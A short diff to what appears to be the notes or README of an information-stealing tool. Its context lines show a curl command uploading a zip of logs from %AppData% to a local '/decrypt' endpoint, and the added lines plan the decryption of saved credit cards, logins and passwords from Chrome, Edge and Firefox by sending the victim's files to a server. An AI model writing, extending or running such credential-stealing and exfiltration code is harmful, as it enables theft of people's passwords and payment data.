@@ -33,3 +33,8 @@ popd
 ::how to send?
 curl -F "file=@%AppData%\moscorlogs.zip" http://127.0.0.1:5000/decrypt
 ```
+
+
+## Todo: 
+- Browser Decryption . CC / Logins / Passwords  (chrome,edge,firefox)
+- - It will send files to the server it will decrypt and return them. :]
